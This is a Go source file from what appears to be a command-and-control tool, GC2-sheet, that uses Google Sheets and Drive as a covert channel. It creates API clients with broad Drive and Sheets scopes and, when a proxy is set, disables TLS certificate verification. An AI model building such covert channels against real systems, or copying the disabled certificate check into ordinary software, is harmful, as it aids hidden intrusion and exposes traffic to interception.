package C2

import (
	"GC2-sheet/internal/configuration"
	"context"
	"crypto/tls"
	"fmt"
	"golang.org/x/oauth2"
	"google.golang.org/api/drive/v3"
	"net/http"

	"google.golang.org/api/option"
	"google.golang.org/api/sheets/v4"
	GHTTP "google.golang.org/api/transport/http"
)

type GoogleConnector struct {
	googleSheetConnector sheets.Service
	googleDriveConnector drive.Service
}

var ErrorUnableToCreateGoogleConnector = fmt.Errorf("an error occurred while creating Google connector")

func newSheetsClient() (*sheets.Service, error) {
	ctx, customHTTPClient := customGoogleHTTPClient()
	client, err := sheets.NewService(ctx, option.WithHTTPClient(customHTTPClient))
	if err != nil {
		return nil, err
	}

	return client, nil
}

func newDriveClient() (*drive.Service, error) {
	ctx, customHTTPClient := customGoogleHTTPClient()
	client, err := drive.NewService(ctx, option.WithHTTPClient(customHTTPClient))
	if err != nil {
		return nil, err
	}

	return client, nil
}

func customGoogleHTTPClient() (context.Context, *http.Client) {
	proxyUrl := configuration.GetOptionsProxy()

	transport := &http.Transport{}

	if proxyUrl != nil {
		transport.Proxy = http.ProxyURL(proxyUrl)
		transport.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	}

	ctx := context.Background()
	ctx = context.WithValue(ctx, oauth2.HTTPClient, &http.Client{Transport: transport})

	myTransport, _ := GHTTP.NewTransport(ctx, transport, option.WithScopes(
		"https://www.googleapis.com/auth/drive",
		"https://www.googleapis.com/auth/drive.file",
		"https://www.googleapis.com/auth/drive.readonly",
		"https://www.googleapis.com/auth/spreadsheets",
		"https://www.googleapis.com/auth/spreadsheets.readonly",
	), option.WithCredentialsJSON([]byte(configuration.GetOptionsGoogleServiceAccountKey())))

	return ctx, &http.Client{Transport: myTransport}
}

func NewGoogleConnector() (*GoogleConnector, error) {
	clientSheet, err := newSheetsClient()
	if err != nil {
		return nil, fmt.Errorf("%w: %w", ErrorUnableToCreateGoogleConnector, err)
	}

	clientDrive, err := newDriveClient()
	if err != nil {
		return nil, fmt.Errorf("%w: %w", ErrorUnableToCreateGoogleConnector, err)
	}

	connector := &GoogleConnector{
		googleSheetConnector: *clientSheet,
		googleDriveConnector: *clientDrive,
	}

	return connector, nil
}
